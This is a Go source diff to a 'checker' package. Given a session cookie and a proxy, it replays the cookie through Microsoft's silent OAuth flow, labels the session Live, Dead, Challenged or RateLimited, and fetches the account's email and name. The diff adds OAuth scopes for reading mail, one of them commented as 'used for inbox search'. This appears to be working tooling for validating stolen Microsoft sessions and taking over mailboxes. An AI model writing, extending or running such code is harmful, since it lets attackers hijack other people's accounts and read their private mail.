@@ -16,6 +16,7 @@ package checker
 import (
 	"context"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net/url"
@@ -29,15 +30,21 @@ import (
 )
 
 const (
-	// silentOAuth asks for a token without user interaction. A valid session
-	// yields access_token in the redirect fragment; an invalid one yields
-	// error=login_required.
-	silentOAuth = "https://login.live.com/oauth20_authorize.srf" +
+	// oauthEndpoint is the silent (prompt=none) implicit-grant flow. A valid
+	// session yields access_token in the redirect fragment; an invalid one
+	// yields error=login_required.
+	oauthEndpoint = "https://login.live.com/oauth20_authorize.srf" +
 		"?client_id=000000004C12AE6F" +
-		"&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL" +
 		"&response_type=token" +
 		"&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
-		"&display=touch&locale=en&prompt=none"
+		"&display=touch&locale=en&prompt=none&scope="
+
+	// ScopeMail authenticates the mailbox service. Used for the check probe.
+	ScopeMail = "service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
+	// ScopeGraph requests Graph Mail.Read, used for inbox search.
+	ScopeGraph = "https%3A%2F%2Fgraph.microsoft.com%2FMail.Read"
+	// ScopeREST requests the legacy Outlook REST mail scope.
+	ScopeREST = "https%3A%2F%2Foutlook.office.com%2Fmail.read"
 
 	// owaConfig is a cookie-only endpoint that answers 401 without a session.
 	// Used as a fallback when the OAuth client is unavailable.
@@ -47,6 +54,12 @@ const (
 	profileAPI = "https://substrate.office.com/profileb2/v2/me/V2?$select=displayName,mail"
 
 	bodyLimit = 4 << 20
+)
+
+var (
+	errLoginRequired = errors.New("login_required")
+	errInteraction   = errors.New("interaction_required")
+	errRateLimited   = errors.New("rate limited")
 )
 
 // Verdict is the outcome of a single check.
@@ -108,11 +121,10 @@ func (c *Checker) Check(ctx context.Context, ck *Cookie, proxyURL string) (res R
 		return res
 	}
 
-	probe := c.oauthProbe(ctx, client, ck.Header())
-
-	switch probe.kind {
-	case probeToken:
-		email, name := c.profile(ctx, client, probe.token)
+	tok, err := c.token(ctx, client, ck.Header(), ScopeMail)
+	switch {
+	case err == nil:
+		email, name := c.profile(ctx, client, tok)
 		res.Verdict = Live
 		res.Email = email
 		res.Name = name
@@ -121,88 +133,73 @@ func (c *Checker) Check(ctx context.Context, ck *Cookie, proxyURL string) (res R
 		}
 		return res
 
-	case probeLoginRequired:
+	case errors.Is(err, errLoginRequired):
 		res.Verdict = Dead
 		res.Reason = "session expired"
 		return res
 
-	case probeInteraction:
+	case errors.Is(err, errInteraction):
 		res.Verdict = Challenged
-		res.Reason = probe.detail
+		res.Reason = "challenge: " + err.Error()
 		return res
 
-	case probeRateLimited:
+	case errors.Is(err, errRateLimited):
 		res.Verdict = RateLimited
 		res.Reason = "rate limited"
 		return res
 	}
 
-	// Ambiguous or client-unavailable: fall back to the cookie-only endpoint.
+	// Ambiguous or the OAuth client is unusable: fall back to the cookie-only
+	// endpoint so a retired client_id cannot produce false dead results.
 	return c.cookieProbe(ctx, client, ck.Header(), res)
 }
 
-type probeKind int
-
-const (
-	probeUnknown probeKind = iota
-	probeToken
-	probeLoginRequired
-	probeInteraction
-	probeRateLimited
-)
-
-type oauthResult struct {
-	kind   probeKind
-	token  string
-	detail string
-}
-
-func (c *Checker) oauthProbe(ctx context.Context, client tls_client.HttpClient, cookieHeader string) oauthResult {
-	req, err := fhttp.NewRequestWithContext(ctx, fhttp.MethodGet, silentOAuth, nil)
+// token runs the silent OAuth flow for a scope and returns the access token.
+func (c *Checker) token(ctx context.Context, client tls_client.HttpClient, cookieHeader, scope string) (string, error) {
+	req, err := fhttp.NewRequestWithContext(ctx, fhttp.MethodGet, oauthEndpoint+scope, nil)
 	if err != nil {
-		return oauthResult{kind: probeUnknown}
+		return "", err
 	}
 	req.Header = browserHeaders(cookieHeader)
 
 	resp, err := client.Do(req)
 	if err != nil {
-		return oauthResult{kind: probeUnknown, detail: classifyNetErr(err)}
+		return "", err
 	}
 	defer resp.Body.Close()
 	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<20))
 
 	if resp.StatusCode == fhttp.StatusTooManyRequests {
-		return oauthResult{kind: probeRateLimited}
+		return "", errRateLimited
 	}
-	if resp.StatusCode != fhttp.StatusFound && resp.StatusCode != fhttp.StatusSeeOther && resp.StatusCode != fhttp.StatusTemporaryRedirect {
-		return oauthResult{kind: probeUnknown, detail: fmt.Sprintf("oauth http %d", resp.StatusCode)}
+	if resp.StatusCode != fhttp.StatusFound &&
+		resp.StatusCode != fhttp.StatusSeeOther &&
+		resp.StatusCode != fhttp.StatusTemporaryRedirect {
+		return "", fmt.Errorf("oauth http %d", resp.StatusCode)
 	}
 
 	loc, err := url.Parse(resp.Header.Get("Location"))
 	if err != nil {
-		return oauthResult{kind: probeUnknown, detail: "oauth location unparseable"}
+		return "", fmt.Errorf("oauth location unparseable")
 	}
 	params, err := url.ParseQuery(loc.Fragment)
 	if err != nil {
-		return oauthResult{kind: probeUnknown, detail: "oauth fragment unparseable"}
+		return "", fmt.Errorf("oauth fragment unparseable")
 	}
 
 	if tok := params.Get("access_token"); tok != "" {
-		return oauthResult{kind: probeToken, token: tok}
+		return tok, nil
 	}
 
 	switch params.Get("error") {
 	case "login_required":
-		return oauthResult{kind: probeLoginRequired}
+		return "", errLoginRequired
 	case "interaction_required", "consent_required", "access_denied":
-		return oauthResult{kind: probeInteraction, detail: "challenge: " + params.Get("error")}
-	case "unauthorized_client", "invalid_client", "unsupported_response_type":
-		// The OAuth client itself is unusable — not a statement about the cookie.
-		return oauthResult{kind: probeUnknown, detail: params.Get("error")}
+		return "", fmt.Errorf("%w: %s", errInteraction, params.Get("error"))
 	case "":
-		return oauthResult{kind: probeUnknown, detail: "no token, no error"}
+		return "", fmt.Errorf("oauth: no token and no error")
 	default:
-		return oauthResult{kind: probeUnknown, detail: "oauth: " + params.Get("error")}
+		return "", fmt.Errorf("oauth: %s", params.Get("error"))
 	}
 }
 
